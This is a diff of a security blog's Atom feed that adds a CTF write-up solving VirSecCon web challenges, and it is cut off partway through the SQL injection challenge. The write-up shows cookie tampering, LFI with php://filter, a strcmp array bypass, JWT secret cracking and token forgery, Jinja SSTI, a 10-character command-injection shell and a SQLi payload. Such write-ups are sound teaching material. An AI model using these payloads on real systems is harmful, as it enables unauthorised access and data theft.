@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-04-18T16:01:09+05:45</updated><id>http://localhost:4000/feed.xml</id><title type="html">gr4n173</title><subtitle>Hi there, I am a nerd guy who loves everything in between Internet and Security . I reach out to people and teach about CyberSecurity. I like to play with electronics in my spare time so that I can automate my lifestyle . CTF | HTB | Reverse Engineering.
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-04-18T20:35:21+05:45</updated><id>http://localhost:4000/feed.xml</id><title type="html">gr4n173</title><subtitle>Hi there, I am a nerd guy who loves everything in between Internet and Security . I reach out to people and teach about CyberSecurity. I like to play with electronics in my spare time so that I can automate my lifestyle . CTF | HTB | Reverse Engineering.
 </subtitle><author><name>gr4n173&gt;</name></author><entry><title type="html">Hack The Box: Mango</title><link href="http://localhost:4000/2020/04/18/htb-mango.html" rel="alternate" type="text/html" title="Hack The Box: Mango" /><published>2020-04-18T00:00:00+05:45</published><updated>2020-04-18T00:00:00+05:45</updated><id>http://localhost:4000/2020/04/18/htb-mango</id><content type="html" xml:base="http://localhost:4000/2020/04/18/htb-mango.html">&lt;h1 id=&quot;htbmango&quot;&gt;HTB:Mango&lt;/h1&gt;
 
 &lt;p&gt;Mango box was the medium box. It falls under linux and medium category. Especially to get user flag was a quite difficult one. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag by generating the username and password of &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt;user of mongodb. For root, I used &lt;code class=&quot;highlighter-rouge&quot;&gt;jjs&lt;/code&gt; command line tool to access the root.txt file. I’ll show all my payload(including that didn’t work in initial deployment to get the root).&lt;/p&gt;
@@ -206,7 +206,7 @@ jjs&amp;gt; while ((line = br.readLine()) != null) { print(line); }
 jjs&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;This way I got the root of zetta box and learned alot from this box. So I would like to thank creator of this box &lt;code class=&quot;highlighter-rouge&quot;&gt;MrR3b00t&lt;/code&gt; for such an awesome box.&lt;/p&gt;
+&lt;p&gt;This way I got the root of zetta box and learned alot from this box. So I would like to thank creator of this box &lt;code class=&quot;highlighter-rouge&quot;&gt;MrR3boot&lt;/code&gt; for such an awesome box.&lt;/p&gt;
 
 &lt;p&gt;I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup.&lt;/p&gt;
 
@@ -214,7 +214,387 @@ jjs&amp;gt;
 
 &lt;p&gt;Tweet about this writeup if you like.&lt;/p&gt;
 
-&lt;p&gt;You can see more blog at my medium here: &lt;a href=&quot;https://medium.com/@gr4n173&quot;&gt;gr4n173&lt;/a&gt;.&lt;/p&gt;</content><author><name>gr4n173&gt;</name></author><category term="linux" /><category term="htb" /><category term="mongodb" /><category term="jjs" /><category term="Nosql" /><summary type="html">HTB:Mango</summary></entry><entry><title type="html">VirSecCon CTF: Scripting Challenges</title><link href="http://localhost:4000/2020/04/13/virseccon-ctf-scripting.html" rel="alternate" type="text/html" title=" VirSecCon CTF: Scripting Challenges" /><published>2020-04-13T00:00:00+05:45</published><updated>2020-04-13T00:00:00+05:45</updated><id>http://localhost:4000/2020/04/13/virseccon-ctf-scripting</id><content type="html" xml:base="http://localhost:4000/2020/04/13/virseccon-ctf-scripting.html">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
+&lt;p&gt;You can see more blog at my medium here: &lt;a href=&quot;https://medium.com/@gr4n173&quot;&gt;gr4n173&lt;/a&gt;.&lt;/p&gt;</content><author><name>gr4n173&gt;</name></author><category term="linux" /><category term="htb" /><category term="mongodb" /><category term="jjs" /><category term="Nosql" /><summary type="html">HTB:Mango</summary></entry><entry><title type="html">VirSecCon CTF: Web Challenges</title><link href="http://localhost:4000/2020/04/17/virseccon-ctf-web.html" rel="alternate" type="text/html" title=" VirSecCon CTF: Web Challenges" /><published>2020-04-17T00:00:00+05:45</published><updated>2020-04-17T00:00:00+05:45</updated><id>http://localhost:4000/2020/04/17/virseccon-ctf-web</id><content type="html" xml:base="http://localhost:4000/2020/04/17/virseccon-ctf-web.html">&lt;h2 id=&quot;web-challenges&quot;&gt;Web Challenges&lt;/h2&gt;
+
+&lt;p&gt;Web challenge was related to the Php, Server Side Template Injection(SSTI), SQL vulnerability, Jwt etc..&lt;/p&gt;
+
+&lt;h3 id=&quot;1-countdown&quot;&gt;1. Countdown&lt;/h3&gt;
+&lt;h4 id=&quot;description-60&quot;&gt;Description [60]&lt;/h4&gt;
+&lt;p&gt;We hear something beeping… is there something in the oven?&lt;/p&gt;
+
+&lt;p&gt;Connect here: http://jh2i.com:50036.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:- As I visited the site there was nothing in source-code except &lt;code class=&quot;highlighter-rouge&quot;&gt;defuse.php&lt;/code&gt; so I fired my burp-suite and intercepted and got &lt;code class=&quot;highlighter-rouge&quot;&gt;detonate_time&lt;/code&gt; cookie as &lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;Cookie: detonate_time=1587109772 &lt;/code&gt;
+and changed it more than it was &lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;Cookie: detonate_time=99999999999999999999999999&lt;/code&gt;
+this way I got the flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/ctf/countdown_flag_virseccon.jpg&quot; alt=&quot;countdown_flag&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;2-hot-access&quot;&gt;2. Hot Access&lt;/h3&gt;
+&lt;h4 id=&quot;description-70&quot;&gt;Description [70]&lt;/h4&gt;
+&lt;p&gt;Access to all the latest modules, hot off the press! What can you access?&lt;/p&gt;
+
+&lt;p&gt;Connect here: http://jh2i.com:50016&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:- As the challenge name was &lt;code class=&quot;highlighter-rouge&quot;&gt;hotaccess&lt;/code&gt; and it was using a simple php module with resources from apache web server. So I checked the &lt;code class=&quot;highlighter-rouge&quot;&gt;date&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;time&lt;/code&gt;  got the new paramter
+&lt;code class=&quot;highlighter-rouge&quot;&gt;http://jh2i.com:50016/?m=modules/date.php&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Now I accessed &lt;code class=&quot;highlighter-rouge&quot;&gt;.htaccess&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;?m=.htaccess&lt;/code&gt; which was a default file created by apache in every webserver and got output.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/ctf/htaccess_virseccon.jpg&quot; alt=&quot;.htaccess&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;On viewing-source code I got &lt;code class=&quot;highlighter-rouge&quot;&gt;sshh_don_tell_i_hid_the_flag_here&lt;/code&gt; dir.&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nt&quot;&gt;&amp;lt;Directory&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;www&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;html&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sshh_dont_tell_i_hid_the_flag_here&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+	
+	AllowOverride All
+ 
+ &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Directory&amp;gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;and visited that dir as 
+&lt;code class=&quot;highlighter-rouge&quot;&gt;?m=sshh_dont_tell_i_hid_the_flag_here/flag.txt&lt;/code&gt;. Then I finally got the flag with 70 points.&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;LLS{htaccess_can_control_what_you_access}&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;3-magician&quot;&gt;3. Magician&lt;/h3&gt;
+&lt;h4 id=&quot;description-80&quot;&gt;Description [80]&lt;/h4&gt;
+&lt;p&gt;Show me a hat trick!&lt;/p&gt;
+
+&lt;p&gt;Connect here: http://jh2i.com:50000&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:- Challenge presents a hash in home page &lt;code class=&quot;highlighter-rouge&quot;&gt;==0e953532678923638053842468642408&lt;/code&gt;. So I tried with md5 decrypt but failed then I looked over the challenge name word ‘Magic Hash’ and got this github repo which was quite interesting one.
+&lt;a href=&quot;https://github.com/spaze/hashes/blob/master/md5.md&quot;&gt;https://github.com/spaze/hashes/blob/master/md5.md&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Entering any string of that hash I got the flag.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;LLS{magic_hashes_make_for_a_good_show} &lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;4-phpjuggler&quot;&gt;4. PHPJuggler&lt;/h3&gt;
+&lt;h4 id=&quot;decription-80&quot;&gt;Decription [80]&lt;/h4&gt;
+&lt;p&gt;PHP is here to entertain again! They’ve shown you magic tricks, disappearing acts, and now… juggling!&lt;/p&gt;
+
+&lt;p&gt;Connect here: http://jh2i.com:50030.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:- As I visited the site and found a php code which was working in backend.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+    
+    &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'flag.php'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'flag'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'flag'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$flag&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;You got it! That's the correct flag! &amp;lt;br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;NOPE! Wrong flag.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;nb&quot;&gt;highlight_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;   
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Here I found &lt;code class=&quot;highlighter-rouge&quot;&gt;strcmp()&lt;/code&gt; function which compares the strings and that function willn’t handle the array. So I fired my burp-suite and send parameter as an array. This way I got the flag .&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;flag=fsd&lt;/code&gt; =» &lt;code class=&quot;highlighter-rouge&quot;&gt;flag[]=fsd&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Warning: strcmp() expects parameter 1 to be string, array given in /var/www/html/index.php on line 6
+You got it! That's the correct flag!
+LLS{php_dropped_the_ball_again}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;5-glhf&quot;&gt;5. GLHF&lt;/h3&gt;
+&lt;h4 id=&quot;description-90&quot;&gt;Description [90]&lt;/h4&gt;
+&lt;p&gt;LMFAO! FLAG PLZ, THX!&lt;/p&gt;
+
+&lt;p&gt;Connect here: http://jh2i.com:50014&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:- After visiting the challenge I got many urls and I noticed &lt;code class=&quot;highlighter-rouge&quot;&gt;FLAG&lt;/code&gt; and submit it as&lt;br /&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;/index.php?page=FLAG&lt;/code&gt;
+and got&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; FLAG????
+WTF, PLZ??? 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;On viewing source I got&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &amp;lt;!-- SRY PHP LFI NBD --&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;So I php was vulnerable to LFI I brute forced with the wordlist of LFI and got the &lt;code class=&quot;highlighter-rouge&quot;&gt;php://filter/convert.base64-encode/resource=FLAG&lt;/code&gt; as lfi injection point. You can visit here for more &lt;a href=&quot;https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf&quot;&gt;Juggling tricks&lt;/a&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KICAgIDxoZWFkPgogICAgICAgIDx0aXRsZT4gUEhQTEZJWFlaIDwvdGl0bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keT4KCiAgICA8aDE+IEZMQUc/Pz8/IDwvaDE+CgogICAgPGgxPiBXVEYsIFBMWj8/PyA8L2gxPgoKICAgIDwhLS0gU1JZIFBIUCBMRkkgTkJEIC0tPgoKICAgIDwvYm9keT4KPC9odG1sPgo8P3BocAogICAgLyoKICAgIC8vIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKICAgICAgICAgICAgICAgICAgICAgICAgTExTe2xtZmFvX3BocF9maWx0ZXJzX2Z0d30KCiAgICAvLyBfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KICAgICovCj8+Cg==
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;I tried to decode this and got the flag.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+root@gr4n173:~# echo &quot;PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KICAgIDxoZWFkPgogICAgICAgIDx0aXRsZT4gUEhQTEZJWFlaIDwvdGl0bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keT4KCiAgICA8aDE+IEZMQUc/Pz8/IDwvaDE+CgogICAgPGgxPiBXVEYsIFBMWj8/PyA8L2gxPgoKICAgIDwhLS0gU1JZIFBIUCBMRkkgTkJEIC0tPgoKICAgIDwvYm9keT4KPC9odG1sPgo8P3BocAogICAgLyoKICAgIC8vIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKICAgICAgICAgICAgICAgICAgICAgICAgTExTe2xtZmFvX3BocF9maWx0ZXJzX2Z0d30KCiAgICAvLyBfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KICAgICovCj8+Cg== &quot; | base64 -d  
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+    &lt;span class=&quot;cm&quot;&gt;/*
+    // _______________________________________________________________
+
+                        LLS{lmfao_php_filters_ftw}
+
+    // _______________________________________________________________
+    */&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;6-jawt&quot;&gt;6. JaWT&lt;/h3&gt;
+&lt;h4 id=&quot;description-90-1&quot;&gt;Description [90]&lt;/h4&gt;
+&lt;p&gt;Check the admin’s scratchpad!&lt;/p&gt;
+
+&lt;p&gt;Connect here: http://jh2i.com:50019/&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:-On visiting the site I was able to login in as any user except &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; so I fired my burp-suite and while intercepting with burp-suite I got the cookie parameter &lt;code class=&quot;highlighter-rouge&quot;&gt;jwt&lt;/code&gt;  &lt;code class=&quot;highlighter-rouge&quot;&gt;jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciJ9.5nMC3j7S-1AH_LuDtr4LQwfnnN_3MiX--d1B07Kt07A&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Header:-&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;{
+  “alg”: “HS256”,
+  “typ”: “JWT”
+}&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Payload:-&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;{
+  “user”: “user”&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I found a superb website to edit jwt &lt;a href=&quot;https://jwt.io/&quot;&gt;jwt.io&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;and now requied a secret key for that I used john to crack the jwt&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gr4n173:~#echo &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciJ9.DjF2o4bohTFKW9dyR6QfpU397jLnmvITGK8KgCYmXhQ&quot; &amp;gt; jwt
+root@gr4n173:~# john jwt
+Using default input encoding: UTF-8
+Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])
+Will run 4 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
+Proceeding with incremental:ASCII
+fuckit           (?)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;I used that secret key and edited user &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; =&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/ctf/jwt_token_virseccon.png&quot; alt=&quot;jwt_token&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;and submited in burp-suite and finally got the flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/ctf/jwt_flag_virseccon.png&quot; alt=&quot;jwt_flag&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;LLS{jawt_was_just_what_you_thought}&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;7-mask&quot;&gt;7. Mask&lt;/h3&gt;
+&lt;h4 id=&quot;description-90-2&quot;&gt;Description [90]&lt;/h4&gt;
+&lt;p&gt;Take off your mask.&lt;/p&gt;
+
+&lt;p&gt;Connect here: http://jh2i.com:50023.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:-After visiting challenge website I got the Jinja =&amp;gt; Python template so first thing I thought was only Server-Side Template Injection(SSTI). so I tried&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/ctf/payload_virseccon.jpg&quot; alt=&quot;ssti&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;and I got the &lt;code class=&quot;highlighter-rouge&quot;&gt;4&lt;/code&gt; as output so then checked for &lt;code class=&quot;highlighter-rouge&quot;&gt;config&lt;/code&gt; files.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/public/images/ctf/config_virseccon.jpg&quot; alt=&quot;config&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And got the many configuration keys along with &lt;code class=&quot;highlighter-rouge&quot;&gt;secret key&lt;/code&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;``‘SECRET_KEY’: ‘LLS{server_side_template_injection_unmasked}`&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This way I got the flag. If you like to read more about SSTI then you can visit &lt;a href=&quot;https://owasp-skf.gitbook.io/asvs-write-ups/kbid-267-server-side-template-injection&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;8-10-character-web-shell&quot;&gt;8. 10 Character Web Shell&lt;/h3&gt;
+&lt;h4 id=&quot;description-100&quot;&gt;Description [100]&lt;/h4&gt;
+&lt;p&gt;Only 10 char–&lt;/p&gt;
+
+&lt;p&gt;Connect here: http://jh2i.com:50001.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:- After visiting the challenge I got a simple php backend code.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+
+    &lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;strlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;too long!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;highlight_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;__FILE__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;and used paramter as &lt;code class=&quot;highlighter-rouge&quot;&gt;http://jh2i.com:50001/?c=cat flag*&lt;/code&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;LLS{you_really_can_see_in_the_dark} &lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This way I got the flag .&lt;/p&gt;
+
+&lt;h3 id=&quot;9-sequelitis&quot;&gt;9. Sequelitis&lt;/h3&gt;
+&lt;h4 id=&quot;description-100-1&quot;&gt;Description [100]&lt;/h4&gt;
+&lt;p&gt;Sequelitis has moved to a new database for keeping track of their customers. Break in.&lt;/p&gt;
+
+&lt;p&gt;Connect here: http://jh2i.com:50034.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Solution&lt;/strong&gt;:- As the challenge name &lt;code class=&quot;highlighter-rouge&quot;&gt;Sequelitis&lt;/code&gt; which indicate there was sqli. So at first I tried a simple payload &lt;code class=&quot;highlighter-rouge&quot;&gt;' or 1==1 --&lt;/code&gt; didn’t work and slightly changed to &lt;code class=&quot;highlighter-rouge&quot;&gt;'or 1==1 -- -&lt;/code&gt; I got the output&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Trey Maxam: 1010
+Joe Benin: 2001
+Grant Wyman: 1337
+John Hammond: 1785
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
